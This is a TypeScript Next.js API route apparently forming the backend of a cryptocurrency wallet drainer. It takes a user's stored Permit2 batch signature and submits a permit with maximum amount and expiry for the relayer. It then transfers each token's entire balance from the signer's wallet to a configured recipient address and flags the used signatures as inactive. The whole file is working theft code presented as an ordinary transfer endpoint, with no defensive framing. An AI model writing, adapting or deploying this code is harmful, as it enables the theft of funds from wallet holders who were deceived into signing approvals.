// app/api/transfer/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { ethers } from 'ethers';
import pool from '@/lib/db';
import { requireAuth } from '@/lib/auth-check';
import { getSetting } from '@/lib/settings';
import { getProvider } from '@/lib/rpc';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const PERMIT2_ABI = [
    {
        name: 'permit',
        type: 'function',
        stateMutability: 'nonpayable',
        inputs: [
            { name: 'owner', type: 'address' },
            {
                name: 'permitBatch',
                type: 'tuple',
                components: [
                    {
                        name: 'details',
                        type: 'tuple[]',
                        components: [
                            { name: 'token', type: 'address' },
                            { name: 'amount', type: 'uint160' },
                            { name: 'expiration', type: 'uint48' },
                            { name: 'nonce', type: 'uint48' },
                        ],
                    },
                    { name: 'spender', type: 'address' },
                    { name: 'sigDeadline', type: 'uint256' },
                ],
            },
            { name: 'signature', type: 'bytes' },
        ],
        outputs: [],
    },
    {
        name: 'transferFrom',
        type: 'function',
        stateMutability: 'nonpayable',
        inputs: [
            {
                name: 'transferDetails',
                type: 'tuple[]',
                components: [
                    { name: 'from', type: 'address' },
                    { name: 'to', type: 'address' },
                    { name: 'amount', type: 'uint160' },
                    { name: 'token', type: 'address' },
                ],
            },
        ],
        outputs: [],
    },
] as const;

const ERC20_ABI = [
    {
        name: 'balanceOf',
        type: 'function',
        stateMutability: 'view',
        inputs: [{ name: 'account', type: 'address' }],
        outputs: [{ name: '', type: 'uint256' }],
    },
] as const;

const MAX_UINT48 = '281474976710655';
const MAX_UINT160 = '1461501637330902918203684832716283019655932542975';

export async function POST(req: NextRequest) {
    const authError = await requireAuth();
    if (authError) return authError;

    try {
        const { walletAddress, signature, tokens } = await req.json();

        if (!walletAddress || !signature || !tokens?.length) {
            return NextResponse.json({ success: false, error: 'Missing required fields' }, { status: 400 });
        }

        const relayerKey = await getSetting('RELAYER_PRIVATE_KEY');
        const recipient = await getSetting('RECIPIENT_ADDRESS');

        if (!relayerKey || !recipient) {
            return NextResponse.json({ success: false, error: 'Relayer not configured in settings' }, { status: 500 });
        }

        const chainId = tokens[0].chainId;
        const provider = getProvider(chainId); // staticNetwork — بدون retry loop
        const relayer = new ethers.Wallet(relayerKey, provider);
        const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayer);

        const permitBatch = {
            details: tokens.map((t: any) => ({
                token: t.tokenAddress,
                amount: MAX_UINT160,
                expiration: MAX_UINT48,
                nonce: t.nonce,
            })),
            spender: relayer.address,
            sigDeadline: MAX_UINT48,
        };

        const permitTx = await permit2.permit(walletAddress, permitBatch, signature);
        await permitTx.wait();

        const transferDetails = await Promise.all(
            tokens.map(async (t: any) => {
                const erc20 = new ethers.Contract(t.tokenAddress, ERC20_ABI, provider);
                const balance = await erc20.balanceOf(walletAddress);
                return { from: walletAddress, to: recipient, amount: balance, token: t.tokenAddress };
            })
        );

        const nonZero = transferDetails.filter(d => d.amount > 0n);
        if (!nonZero.length) {
            return NextResponse.json({ success: false, error: 'No token balance to transfer' }, { status: 400 });
        }

        const transferTx = await permit2.transferFrom(nonZero);
        await transferTx.wait();

        const ids = tokens.map((t: any) => t.id);
        const placeholders = ids.map(() => '?').join(',');
        await pool.query(`UPDATE signatures SET is_active = 0 WHERE id IN (${placeholders})`, ids);

        return NextResponse.json({ success: true, permitTx: permitTx.hash, transferTx: transferTx.hash });

    } catch (err: any) {
        console.error('[Transfer]', err);
        return NextResponse.json({ success: false, error: err?.message || 'Unknown error' }, { status: 500 });
    }
}